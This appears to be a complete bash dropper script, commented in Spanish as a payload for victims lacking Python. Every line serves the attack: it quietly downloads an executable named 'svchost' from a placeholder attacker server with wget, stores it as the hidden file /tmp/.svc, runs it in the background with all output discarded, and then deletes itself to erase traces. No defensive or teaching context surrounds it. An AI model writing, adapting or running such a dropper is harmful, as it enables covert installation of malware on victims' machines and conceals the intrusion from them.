#!/bin/bash
# Script de payload para víctimas sin Python

# Descargar el ejecutable
wget -q http://YOUR_SERVER_IP:8000/svchost -O /tmp/.svc
chmod +x /tmp/.svc

# Ejecutar en background
nohup /tmp/.svc > /dev/null 2>&1 &

# Borrar este script
rm -f $0
